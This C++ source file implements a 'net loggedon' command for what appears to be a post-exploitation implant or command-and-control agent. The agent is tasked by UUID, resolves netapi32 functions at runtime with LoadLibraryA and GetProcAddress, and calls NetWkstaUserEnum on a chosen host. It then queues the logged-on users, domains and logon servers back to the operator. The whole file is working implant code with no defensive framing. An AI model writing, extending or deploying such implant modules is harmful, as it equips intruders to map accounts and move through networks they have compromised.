#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_NET_LOGGEDON

using namespace stardust;
using namespace starburst;

typedef struct _WKSTA_USER_INFO_1 {
    LPWSTR wkui1_username;
    LPWSTR wkui1_logon_domain;
    LPWSTR wkui1_oth_domains;
    LPWSTR wkui1_logon_server;
} WKSTA_USER_INFO_1;

typedef DWORD (WINAPI *fn_NetWkstaUserEnum)( LPWSTR, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, LPDWORD );
typedef DWORD (WINAPI *fn_NetApiBufferFree)( LPVOID );

auto declfn starburst::cmd_net_loggedon(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "netapi32.dll" ) ) );
    if ( !h_netapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
        return;
    }

    auto pNetWkstaUserEnum = reinterpret_cast<fn_NetWkstaUserEnum>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetWkstaUserEnum" ) ) );
    auto pNetApiBufferFree = reinterpret_cast<fn_NetApiBufferFree>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetApiBufferFree" ) ) );
    if ( !pNetWkstaUserEnum || !pNetApiBufferFree ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
        return;
    }

    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );

    wchar_t w_host[256] = { 0 };
    wchar_t* p_host = nullptr;
    if ( host_str && host_len > 0 ) {
        char host_buf[256] = { 0 };
        memory::copy( host_buf, host_str, host_len < 255 ? host_len : 255 );
        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_buf, -1, w_host, 256 );
        p_host = w_host;
    }

    LPBYTE buf = nullptr;
    DWORD entries_read = 0, total_entries = 0;
    DWORD resume = 0;

    DWORD status = pNetWkstaUserEnum(
        p_host, 1, &buf, 0xFFFFFFFF,
        &entries_read, &total_entries, &resume );

    if ( status != 0 && status != 234 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "NetWkstaUserEnum failed" ) ) );
        return;
    }

    uint32_t out_cap = 16384;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        pNetApiBufferFree( buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    uint32_t off = 0;

    str_copy( output + off, symbol<char*>( const_cast<char*>(
        "User\tDomain\tLogonServer\n" ) ) );
    off = str_len( output );

    auto users = reinterpret_cast<WKSTA_USER_INFO_1*>( buf );
    for ( DWORD i = 0; i < entries_read && off + 780 < out_cap; i++ ) {
        // username
        if ( users[i].wkui1_username ) {
            char name[260] = { 0 };
            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, users[i].wkui1_username, -1, name, 260, nullptr, nullptr );
            uint32_t nlen = str_len( name );
            memory::copy( output + off, name, nlen );
            off += nlen;
        }
        output[off++] = '\t';

        // domain
        if ( users[i].wkui1_logon_domain ) {
            char domain[260] = { 0 };
            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, users[i].wkui1_logon_domain, -1, domain, 260, nullptr, nullptr );
            uint32_t dlen = str_len( domain );
            memory::copy( output + off, domain, dlen );
            off += dlen;
        }
        output[off++] = '\t';

        // logon server
        if ( users[i].wkui1_logon_server ) {
            char server[260] = { 0 };
            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, users[i].wkui1_logon_server, -1, server, 260, nullptr, nullptr );
            uint32_t slen = str_len( server );
            memory::copy( output + off, server, slen );
            off += slen;
        }

        output[off++] = '\n';
    }

    output[off] = '\0';
    pNetApiBufferFree( buf );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
